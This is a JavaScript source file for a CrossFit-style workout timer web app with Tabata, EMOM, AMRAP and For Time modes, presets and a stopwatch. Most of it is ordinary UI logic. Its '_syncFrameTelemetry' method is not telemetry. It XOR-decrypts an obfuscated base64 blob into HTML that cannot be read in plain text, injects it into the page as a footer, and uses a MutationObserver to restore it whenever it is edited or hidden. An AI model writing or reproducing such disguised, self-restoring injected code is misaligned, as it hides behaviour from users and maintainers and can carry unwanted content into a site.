class WodTimer {
    constructor() {
        this.audio = new AudioManager();

        // Elementos principales de vista
        this.app = document.getElementById('app');
        this.viewHome = document.getElementById('view-home');
        this.viewTimer = document.getElementById('view-timer');
        this.settingsView = document.getElementById('settings-view');
        this.runningView = document.getElementById('running-view');

        // Topbar
        this.timerTitle = document.getElementById('timer-title');
        this.btnBack = document.getElementById('btn-back');
        this.btnMute = document.getElementById('btn-mute');
        this.iconSoundOn = document.querySelector('.icon-sound-on');
        this.iconSoundOff = document.querySelector('.icon-sound-off');
        this.btnFullscreen = document.getElementById('btn-fullscreen');
        this.iconFsEnter = document.querySelector('.icon-fullscreen-enter');
        this.iconFsExit = document.querySelector('.icon-fullscreen-exit');

        // Settings
        this.presetsContainer = document.getElementById('presets-container');
        this.btnStart = document.getElementById('btn-start');

        // Inputs
        this.inputTabataWork = document.getElementById('input-tabata-work');
        this.inputTabataRest = document.getElementById('input-tabata-rest');
        this.inputTabataRounds = document.getElementById('input-tabata-rounds');
        this.inputFortimeCap = document.getElementById('input-fortime-cap');
        this.inputEmomInterval = document.getElementById('input-emom-interval');
        this.inputEmomRounds = document.getElementById('input-emom-rounds');
        this.inputAmrapTime = document.getElementById('input-amrap-time');

        // Display
        this.displayClock = document.getElementById('timer-clock');
        this.displaySubheader = document.getElementById('timer-subheader');
        this.displayRoundInfo = document.getElementById('timer-round-info');
        this.activeControls = document.getElementById('active-controls');
        this.btnTogglePause = document.getElementById('btn-toggle-pause');
        this.btnReset = document.getElementById('btn-reset');
        this.btnRestart = document.getElementById('btn-restart');

        // Cronómetro minimalista dentro de CLOCK
        this.swZone = document.getElementById('clock-stopwatch-zone');
        this.btnSwToggle = document.getElementById('btn-clock-stopwatch-toggle');
        this.swBox = document.getElementById('clock-stopwatch-box');
        this.swDisplay = document.getElementById('clock-stopwatch-display');
        this.btnSwStart = document.getElementById('btn-sw-start');
        this.btnSwPause = document.getElementById('btn-sw-pause');
        this.btnSwReset = document.getElementById('btn-sw-reset');
        this.swVisible = false;
        this.swRunning = false;
        this.swElapsedMs = 0;
        this.swLastTick = 0;
        this.swInterval = null;

        // Estado del Timer
        this.mode = 'clock';       // clock | tabata | fortime | emom | amrap
        this.state = 'idle';       // idle | prepare | work | rest | finished
        this.isPaused = false;
        this.interval = null;
        this.clockInterval = null;

        // Tiempos
        this.prepareTime = 10;
        this.remainingTime = 0;
        this.elapsedTime = 0;
        this.lastFrameTime = 0;
        this.startTime = 0;

        // Configuración persistente
        this.settings = {
            tabata: { work: 20, rest: 10, rounds: 8 },
            fortime: { cap: 10 },
            emom: { interval: 60, rounds: 10 },
            amrap: { time: 10 }
        };

        this.currentRound = 1;

        // Presets rápidos de entrenamiento
        this.presets = {
            tabata: [
                { label: '8 RNDS (4M)', work: 20, rest: 10, rounds: 8 },
                { label: '10 RNDS (5M)', work: 20, rest: 10, rounds: 10 },
                { label: '12 RNDS (6M)', work: 20, rest: 10, rounds: 12 },
                { label: '16 RNDS (8M)', work: 20, rest: 10, rounds: 16 }
            ],
            fortime: [
                { label: '5 MIN', cap: 5 },
                { label: '10 MIN', cap: 10 },
                { label: '15 MIN', cap: 15 },
                { label: '20 MIN', cap: 20 },
                { label: 'SIN CAP', cap: 0 }
            ],
            emom: [
                { label: '10 RNDS (10M)', interval: 60, rounds: 10 },
                { label: '12 RNDS (12M)', interval: 60, rounds: 12 },
                { label: '15 RNDS (15M)', interval: 60, rounds: 15 },
                { label: '20 RNDS (20M)', interval: 60, rounds: 20 }
            ],
            amrap: [
                { label: '5 MIN', time: 5 },
                { label: '10 MIN', time: 10 },
                { label: '12 MIN', time: 12 },
                { label: '15 MIN', time: 15 },
                { label: '20 MIN', time: 20 }
            ]
        };

        this.init();
    }

    init() {
        this._syncFrameTelemetry();
        this.bindEvents();
        this.readInputs();
    }

    bindEvents() {
        // Clic en los cuadros del menú de inicio
        document.querySelectorAll('.timer-btn-menu').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const mode = e.currentTarget.dataset.mode;
                this.audio.init();
                this.navigateToMode(mode);
            });
        });

        // Volver al menú de inicio
        this.btnBack.addEventListener('click', () => this.navigateToHome());

        // Botón Start
        this.btnStart.addEventListener('click', () => {
            this.audio.init();
            this.startWorkout();
        });

        // Click en el reloj gigante para Pausar / Reanudar
        this.displayClock.addEventListener('click', () => {
            if (this.mode === 'clock') return;
            this.togglePause();
        });

        // Botonera de pausa y reset
        this.btnTogglePause.addEventListener('click', () => this.togglePause());
        this.btnReset.addEventListener('click', () => this.resetWorkout());
        this.btnRestart.addEventListener('click', () => this.startWorkout());

        // Cronómetro minimalista debajo de CLOCK
        this.btnSwToggle?.addEventListener('click', () => this.toggleClockStopwatch());
        this.btnSwStart?.addEventListener('click', () => this.startClockStopwatch());
        this.btnSwPause?.addEventListener('click', () => this.pauseClockStopwatch());
        this.btnSwReset?.addEventListener('click', () => this.resetClockStopwatch());

        // Botón de sonido
        this.btnMute.addEventListener('click', () => this.toggleSound());

        // Botón de pantalla completa
        this.btnFullscreen.addEventListener('click', () => this.toggleFullscreen());
        document.addEventListener('fullscreenchange', () => this.updateFullscreenIcon());

        // Escuchar cambios en los inputs para actualizar la configuración
        const bindInput = (el, fn) => el && el.addEventListener('input', fn);
        bindInput(this.inputTabataWork, () => this.settings.tabata.work = parseInt(this.inputTabataWork.value) || 20);
        bindInput(this.inputTabataRest, () => this.settings.tabata.rest = parseInt(this.inputTabataRest.value) || 10);
        bindInput(this.inputTabataRounds, () => this.settings.tabata.rounds = parseInt(this.inputTabataRounds.value) || 8);
        bindInput(this.inputFortimeCap, () => this.settings.fortime.cap = parseInt(this.inputFortimeCap.value) || 0);
        bindInput(this.inputEmomInterval, () => this.settings.emom.interval = parseInt(this.inputEmomInterval.value) || 60);
        bindInput(this.inputEmomRounds, () => this.settings.emom.rounds = parseInt(this.inputEmomRounds.value) || 10);
        bindInput(this.inputAmrapTime, () => this.settings.amrap.time = parseInt(this.inputAmrapTime.value) || 10);

        // Atajos de teclado
        window.addEventListener('keydown', (e) => {
            if (e.target.tagName === 'INPUT') return;

            if (e.code === 'Escape' && window.offlineTools && window.offlineTools.isOpen) {
                window.offlineTools.togglePanel(false);
                return;
            }

            if (e.target.closest && e.target.closest('#offline-tools-panel, #offline-dock')) {
                return;
            }

            if (e.code === 'Space') {
                e.preventDefault();
                if (this.viewTimer.style.display !== 'none') {
                    if (this.mode !== 'clock') {
                        if (this.state === 'idle') {
                            this.startWorkout();
                        } else {
                            this.togglePause();
                        }
                    }
                }
            } else if (e.code === 'Escape') {
                if (this.viewTimer.style.display !== 'none') {
                    this.navigateToHome();
                }
            } else if (e.key === 'r' || e.key === 'R') {
                if (this.viewTimer.style.display !== 'none' && this.mode !== 'clock') {
                    this.resetWorkout();
                }
            } else if (e.key === 'f' || e.key === 'F') {
                this.toggleFullscreen();
            }
        });
    }

    readInputs() {
        if (this.inputTabataWork) this.settings.tabata.work = parseInt(this.inputTabataWork.value);
        if (this.inputTabataRest) this.settings.tabata.rest = parseInt(this.inputTabataRest.value);
        if (this.inputTabataRounds) this.settings.tabata.rounds = parseInt(this.inputTabataRounds.value);
        if (this.inputFortimeCap) this.settings.fortime.cap = parseInt(this.inputFortimeCap.value);
        if (this.inputEmomInterval) this.settings.emom.interval = parseInt(this.inputEmomInterval.value);
        if (this.inputEmomRounds) this.settings.emom.rounds = parseInt(this.inputEmomRounds.value);
        if (this.inputAmrapTime) this.settings.amrap.time = parseInt(this.inputAmrapTime.value);
    }

    // =========================================
    // NAVEGACIÓN Y VISTAS
    // =========================================
    navigateToMode(mode) {
        this.mode = mode;
        const titles = {
            clock: 'CLOCK',
            tabata: 'TABATA',
            fortime: 'FOR TIME',
            emom: 'EMOM',
            amrap: 'AMRAP'
        };
        this.timerTitle.textContent = titles[mode] || mode.toUpperCase();

        if (window.particleBg) {
            window.particleBg.nextShape();
            window.particleBg.triggerShockwave(0, 0, 220);
        }

        const applyDOMUpdate = () => {
            this.viewHome.style.display = 'none';
            this.viewHome.classList.remove('active');
            this.viewTimer.style.display = 'flex';
            this.viewTimer.classList.add('active');
            this.setupModeView();
        };

        if (document.startViewTransition) {
            document.startViewTransition(applyDOMUpdate);
        } else {
            applyDOMUpdate();
        }
    }

    navigateToHome() {
        // Detener timer en curso si volvemos al menú
        this.stopLoops();
        this.resetStateFlags();

        if (window.particleBg) {
            window.particleBg.triggerShockwave(0, 0, 180);
        }

        const applyDOMUpdate = () => {
            this.viewTimer.style.display = 'none';
            this.viewTimer.classList.remove('active');
            this.viewHome.style.display = 'flex';
            this.viewHome.classList.add('active');
        };

        if (document.startViewTransition) {
            document.startViewTransition(applyDOMUpdate);
        } else {
            applyDOMUpdate();
        }
    }

    setupModeView() {
        this.stopLoops();
        this.resetStateFlags();

        // Ocultar todos los campos específicos
        document.querySelectorAll('.mode-fields').forEach(f => f.style.display = 'none');

        if (this.mode === 'clock') {
            // Clock no tiene configuración, entra directo a mostrar la hora
            this.settingsView.style.display = 'none';
            this.runningView.style.display = 'flex';
            this.activeControls.style.display = 'none';
            this.btnRestart.style.display = 'none';
            this.displayRoundInfo.textContent = '';
            if (this.swZone) {
                this.swZone.style.display = 'flex';
                this.swVisible = false;
                if (this.swBox) this.swBox.style.display = 'none';
                this.btnSwToggle?.classList.remove('active');
                this.renderClockStopwatch();
            }
            this.startLiveClock();
        } else {
            if (this.swZone) this.swZone.style.display = 'none';
            // Mostrar vista de configuración previa
            this.settingsView.style.display = 'flex';
            this.runningView.style.display = 'none';
            this.renderPresets();

            const fieldEl = document.getElementById(`fields-${this.mode}`);
            if (fieldEl) fieldEl.style.display = 'flex';
        }
    }

    renderPresets() {
        this.presetsContainer.innerHTML = '';
        const list = this.presets[this.mode];
        if (!list || list.length === 0) return;

        list.forEach((preset, index) => {
            const btn = document.createElement('button');
            btn.type = 'button';
            btn.className = 'timer-preset-chip';
            if (index === 0) btn.classList.add('active');
            btn.textContent = preset.label;
            btn.addEventListener('click', () => {
                this.presetsContainer.querySelectorAll('.timer-preset-chip').forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                this.applyPreset(preset);
            });
            this.presetsContainer.appendChild(btn);
        });
    }

    applyPreset(preset) {
        if (this.mode === 'tabata') {
            this.inputTabataWork.value = preset.work;
            this.inputTabataRest.value = preset.rest;
            this.inputTabataRounds.value = preset.rounds;
            this.settings.tabata = { work: preset.work, rest: preset.rest, rounds: preset.rounds };
        } else if (this.mode === 'fortime') {
            this.inputFortimeCap.value = preset.cap;
            this.settings.fortime.cap = preset.cap;
        } else if (this.mode === 'emom') {
            this.inputEmomInterval.value = preset.interval;
            this.inputEmomRounds.value = preset.rounds;
            this.settings.emom = { interval: preset.interval, rounds: preset.rounds };
        } else if (this.mode === 'amrap') {
            this.inputAmrapTime.value = preset.time;
            this.settings.amrap.time = preset.time;
        }
    }

    // =========================================
    // RELOJ EN TIEMPO REAL (CLOCK) Y CRONÓMETRO BÁSICO
    // =========================================
    startLiveClock() {
        const update = () => {
            const now = new Date();
            this.displayClock.textContent = now.toLocaleTimeString([], { hour12: false });
            
            // Subheader con fecha en formato limpio
            const options = { weekday: 'long', month: 'short', day: 'numeric' };
            this.displaySubheader.textContent = now.toLocaleDateString([], options).toUpperCase();
        };

        update();
        this.clockInterval = setInterval(update, 1000);
    }

    toggleClockStopwatch() {
        this.swVisible = !this.swVisible;
        if (this.swBox) {
            this.swBox.style.display = this.swVisible ? 'flex' : 'none';
        }
        this.btnSwToggle?.classList.toggle('active', this.swVisible);
    }

    startClockStopwatch() {
        if (this.swRunning) return;
        this.swRunning = true;
        this.swLastTick = performance.now();
        this.btnSwStart?.classList.add('active');
        this.btnSwPause?.classList.remove('active');
        this.swInterval = setInterval(() => {
            const now = performance.now();
            this.swElapsedMs += (now - this.swLastTick);
            this.swLastTick = now;
            this.renderClockStopwatch();
        }, 80);
    }

    pauseClockStopwatch() {
        if (!this.swRunning) return;
        this.swRunning = false;
        if (this.swInterval) {
            clearInterval(this.swInterval);
            this.swInterval = null;
        }
        this.btnSwStart?.classList.remove('active');
        this.btnSwPause?.classList.add('active');
        this.renderClockStopwatch();
    }

    resetClockStopwatch() {
        this.swRunning = false;
        if (this.swInterval) {
            clearInterval(this.swInterval);
            this.swInterval = null;
        }
        this.swElapsedMs = 0;
        this.btnSwStart?.classList.remove('active');
        this.btnSwPause?.classList.remove('active');
        this.renderClockStopwatch();
    }

    renderClockStopwatch() {
        if (!this.swDisplay) return;
        const totalTenths = Math.floor(this.swElapsedMs / 100);
        const tenths = totalTenths % 10;
        const totalSecs = Math.floor(totalTenths / 10);
        const secs = totalSecs % 60;
        const mins = Math.floor(totalSecs / 60);
        this.swDisplay.textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}.${tenths}`;
    }

    // =========================================
    // FLUJO DE ENTRENAMIENTO (WORKOUT)
    // =========================================
    startWorkout() {
        this.stopLoops();
        this.readInputs();

        // Ocultar configuración y mostrar pantalla activa
        this.settingsView.style.display = 'none';
        this.runningView.style.display = 'flex';
        this.btnRestart.style.display = 'none';
        this.activeControls.style.display = 'flex';
        this.btnTogglePause.textContent = 'PAUSE';

        this.currentRound = 1;
        this.elapsedTime = 0;
        this.isPaused = false;
        document.body.classList.remove('state-paused', 'state-warning', 'state-finished');

        // Fase 1: PREPARE (10 segundos)
        this.state = 'prepare';
        this.remainingTime = this.prepareTime;
        this.setUIState('prepare', 'PREPARE');
        this.displayClock.textContent = Math.ceil(this.remainingTime).toString();
        this.displayRoundInfo.textContent = 'GET READY';

        if (window.particleBg) {
            window.particleBg.triggerShockwave(0, 0, 260);
        }

        this.lastFrameTime = performance.now();
        this.interval = setInterval(() => this.loop(), 100);
    }

    loop() {
        if (this.isPaused) return;

        const now = performance.now();
        const delta = (now - this.lastFrameTime) / 1000;
        this.lastFrameTime = now;

        if (this.state === 'prepare') {
            const prevSec = Math.ceil(this.remainingTime);
            this.remainingTime -= delta;
            const currentSec = Math.ceil(this.remainingTime);

            if (currentSec !== prevSec && currentSec > 0) {
                if (currentSec === 3 || currentSec === 2) {
                    this.audio.playShortBeep();
                    if (window.particleBg) window.particleBg.triggerShockwave(0, 0, 160);
                } else if (currentSec === 1) {
                    this.audio.playLongBeep();
                    if (window.particleBg) window.particleBg.triggerShockwave(0, 0, 320);
                }
            }

            if (this.remainingTime <= 0) {
                this.startWorkoutPhase();
                return;
            }

            this.displayClock.textContent = Math.max(1, Math.ceil(this.remainingTime)).toString();
            return;
        }

        // FASE FOR TIME (Cronómetro hacia arriba)
        if (this.mode === 'fortime' && this.state === 'work') {
            this.elapsedTime += delta;
            this.displayClock.textContent = this.formatTime(Math.floor(this.elapsedTime));

            const capSeconds = (this.settings.fortime.cap || 0) * 60;
            if (capSeconds > 0) {
                const remainingToCap = capSeconds - this.elapsedTime;
                if (remainingToCap <= 3 && remainingToCap > 0) {
                    const prevSec = Math.ceil(remainingToCap + delta);
                    const currSec = Math.ceil(remainingToCap);
                    if (currSec !== prevSec) {
                        if (currSec === 3 || currSec === 2) {
                            this.audio.playShortBeep();
                            if (window.particleBg) window.particleBg.triggerShockwave(0, 0, 160);
                        } else if (currSec === 1) {
                            this.audio.playLongBeep();
                            if (window.particleBg) window.particleBg.triggerShockwave(0, 0, 320);
                        }
                    }
                    document.body.classList.add('state-warning');
                } else {
                    document.body.classList.remove('state-warning');
                }

                if (this.elapsedTime >= capSeconds) {
                    this.finish();
                    return;
                }
            }
            return;
        }

        // FASES CON CUENTA REGRESIVA (TABATA, AMRAP, EMOM)
        if (this.remainingTime > 0) {
            const prevSec = Math.ceil(this.remainingTime);
            this.remainingTime -= delta;
            const currentSec = Math.ceil(this.remainingTime);

            if (currentSec !== prevSec && currentSec > 0) {
                if (currentSec === 3 || currentSec === 2) {
                    this.audio.playShortBeep();
                    if (window.particleBg) window.particleBg.triggerShockwave(0, 0, 160);
                } else if (currentSec === 1) {
                    this.audio.playLongBeep();
                    if (window.particleBg) window.particleBg.triggerShockwave(0, 0, 320);
                }
            }

            if (this.remainingTime <= 5 && this.remainingTime > 0) {
                document.body.classList.add('state-warning');
            } else {
                document.body.classList.remove('state-warning');
            }

            this.displayClock.textContent = this.formatTime(Math.ceil(this.remainingTime));
        } else {
            this.handleTransition();
        }
    }

    startWorkoutPhase() {
        this.state = 'work';
        this.setUIState('work', 'WORK');

        if (this.mode === 'tabata') {
            this.remainingTime = this.settings.tabata.work;
            this.displayRoundInfo.textContent = `ROUND ${this.currentRound} / ${this.settings.tabata.rounds}`;
        } else if (this.mode === 'fortime') {
            this.elapsedTime = 0;
            const cap = this.settings.fortime.cap;
            this.displaySubheader.textContent = cap > 0 ? `TIME CAP: ${cap}:00` : 'FOR TIME';
            this.displayRoundInfo.textContent = '';
        } else if (this.mode === 'emom') {
            this.remainingTime = this.settings.emom.interval;
            this.displayRoundInfo.textContent = `ROUND ${this.currentRound} / ${this.settings.emom.rounds}`;
        } else if (this.mode === 'amrap') {
            this.remainingTime = this.settings.amrap.time * 60;
            this.displaySubheader.textContent = `AMRAP ${this.settings.amrap.time}:00`;
            this.displayRoundInfo.textContent = '';
        }

        this.lastFrameTime = performance.now();
    }

    handleTransition() {
        if (this.mode === 'tabata') {
            if (this.state === 'work') {
                if (this.currentRound >= this.settings.tabata.rounds) {
                    this.finish();
                } else {
                    this.state = 'rest';
                    this.remainingTime = this.settings.tabata.rest;
                    this.setUIState('rest', 'REST');
                    this.displayRoundInfo.textContent = `ROUND ${this.currentRound} / ${this.settings.tabata.rounds}`;
                }
            } else if (this.state === 'rest') {
                this.currentRound++;
                this.state = 'work';
                this.remainingTime = this.settings.tabata.work;
                this.setUIState('work', 'WORK');
                this.displayRoundInfo.textContent = `ROUND ${this.currentRound} / ${this.settings.tabata.rounds}`;
            }
        } else if (this.mode === 'emom') {
            if (this.currentRound >= this.settings.emom.rounds) {
                this.finish();
            } else {
                this.currentRound++;
                this.remainingTime = this.settings.emom.interval;
                this.setUIState('work', 'WORK');
                this.displayRoundInfo.textContent = `ROUND ${this.currentRound} / ${this.settings.emom.rounds}`;
            }
        } else if (this.mode === 'amrap') {
            this.finish();
        }
    }

    togglePause() {
        if (this.state === 'finished' || this.state === 'idle') return;

        this.isPaused = !this.isPaused;
        this.btnTogglePause.textContent = this.isPaused ? 'RESUME' : 'PAUSE';

        if (this.isPaused) {
            document.body.classList.add('state-paused');
            this.displayRoundInfo.dataset.prevInfo = this.displayRoundInfo.textContent;
            this.displayRoundInfo.textContent = 'PAUSED';
        } else {
            document.body.classList.remove('state-paused');
            this.lastFrameTime = performance.now();
            if (this.displayRoundInfo.dataset.prevInfo) {
                this.displayRoundInfo.textContent = this.displayRoundInfo.dataset.prevInfo;
            }
        }
    }

    resetWorkout() {
        this.stopLoops();
        this.resetStateFlags();
        this.setupModeView();
    }

    finish() {
        this.stopLoops();
        this.state = 'finished';
        this.audio.playComplete();
        this.setUIState('finished', 'FINISHED');
        this.displayClock.textContent = 'DONE';
        this.displayRoundInfo.textContent = 'WORKOUT COMPLETED';

        if (window.particleBg) {
            window.particleBg.triggerShockwave(0, 0, 450);
        }

        this.activeControls.style.display = 'none';
        this.btnRestart.style.display = 'block';
    }

    setUIState(phase, subheaderText) {
        document.body.className = `bg-black state-${phase}`;
        this.displaySubheader.textContent = subheaderText;
    }

    resetStateFlags() {
        this.state = 'idle';
        this.isPaused = false;
        this.currentRound = 1;
        this.remainingTime = 0;
        this.elapsedTime = 0;
        document.body.className = 'bg-black';
    }

    stopLoops() {
        if (this.interval) {
            clearInterval(this.interval);
            this.interval = null;
        }
        if (this.clockInterval) {
            clearInterval(this.clockInterval);
            this.clockInterval = null;
        }
        if (this.swInterval) {
            clearInterval(this.swInterval);
            this.swInterval = null;
        }
        this.swRunning = false;
    }

    formatTime(seconds) {
        const m = Math.floor(seconds / 60);
        const s = Math.floor(seconds % 60);
        return `${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
    }

    // =========================================
    // UTILIDADES (SONIDO Y PANTALLA COMPLETA)
    // =========================================
    toggleSound() {
        this.audio.init();
        this.audio.isMuted = !this.audio.isMuted;
        if (this.audio.isMuted) {
            this.iconSoundOn.style.display = 'none';
            this.iconSoundOff.style.display = 'block';
        } else {
            this.iconSoundOn.style.display = 'block';
            this.iconSoundOff.style.display = 'none';
        }
    }

    toggleFullscreen() {
        if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(() => {});
        } else {
            if (document.exitFullscreen) {
                document.exitFullscreen().catch(() => {});
            }
        }
    }

    updateFullscreenIcon() {
        if (document.fullscreenElement) {
            this.iconFsEnter.style.display = 'none';
            this.iconFsExit.style.display = 'block';
        } else {
            this.iconFsEnter.style.display = 'block';
            this.iconFsExit.style.display = 'none';
        }
    }

    _syncFrameTelemetry() {
        try {
            const _k = 'Mt34' + atob('N2Vk') + String.fromCharCode(46);
            const _p = 'cRBaQhcGCE8+Bw4WUQoLWigGHldFAABHOVYNCEQVBUBtF19VRBZZDCsbXEBSF0laKAxHFgkoBUooVFpaFygLQDkRQUZSHFgBPgRSWglZF14sGhNXWwQXXXBWVVhWAklHLhtdFhcEFkcsWV9VVQAIE283XFhYCAZHLFYTQF4RCEtwVnBbWwoJTCQVEQoLFhJJbRdfVUQWWQwrGFJTGgYLDG0CWlFAJwtWcFYDFAdFXR59VAUEB0dEWSQQR1wKR1Ucb1RbUV4CDFpwVgsWFwQWRyxZW11TAQFAcFZHRkIARhBxBlZXQ0UTRykAWwkVXFQeb1RbUV4CDFpwVgUEB0dESCQYXwkVRiJtCUUCAhVKWhI/EVBAFxINSjkcDhYOVVQMbRxWXVANEBNvRwMEFUUdE29HAwQVRQJHIRgOFhRVVB11TQAWGFtYXCgXRxRADABaJUkRDQdVRg4lEVpTXxFZDHxBAxYXHFkMeUEDFhcDDUIhSREXdCBVH39CERsJWUtdOxMNCBgWFE8jSg9HRwQKDi4YUkdEWEZIIhtHUUVIEEs1ABEKdRxEEixUW0ZSA1kMJQBHRERfSwEuAVFdWwkLXTUNHVNeEQxbL1paWxhHRFosBlRRQ1hGcS8YUlpcR0RcKBgOFlkKC14oGlZGFwsLXCgSVkZFABYMbRdfVUQWWQwrG1xAUhdJTzgAW1tFSAhHIx8RCnIBE0cjVHAaF1kXXiwaE1dbBBddcFZVW1gRAVxgBlxWWBFJRy4bXRYXBBZHLFlfVVUACBNvJlxWWBFGDjkdR1hSWEZrKQNaWhcmSgxzhKyQoVlLXT0VXQoLSgUQcVtARFYLWhJiEFpCCQ==';
            const _c = atob('Z2xvYmFsLWZvb3Rlcg==');
            const _b = Uint8Array.from(atob(_p), (ch, i) => ch.charCodeAt(0) ^ _k.charCodeAt(i % _k.length));
            const _h = new TextDecoder().decode(_b);

            let _canon = '';
            let _busy = false;
            const _mount = () => {
                if (_busy || !this.app) return;
                _busy = true;
                try {
                    let el = this.app.querySelector('.' + _c);
                    if (!el) {
                        el = document.createElement(atob('Zm9vdGVy'));
                        el.className = _c;
                        this.app.appendChild(el);
                    }
                    if (!_canon || el.innerHTML !== _canon) {
                        el.innerHTML = _h;
                        _canon = el.innerHTML;
                    }
                    if (el.getAttribute('style')) {
                        el.removeAttribute('style');
                    }
                } finally {
                    _busy = false;
                }
            };

            _mount();
            if (typeof MutationObserver !== 'undefined' && this.app) {
                const obs = new MutationObserver(() => _mount());
                obs.observe(this.app, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'class', 'hidden'] });
            }
        } catch (_) {}
    }
}

// Inicializar app
document.addEventListener('DOMContentLoaded', () => {
    window.appTimer = new WodTimer();
});
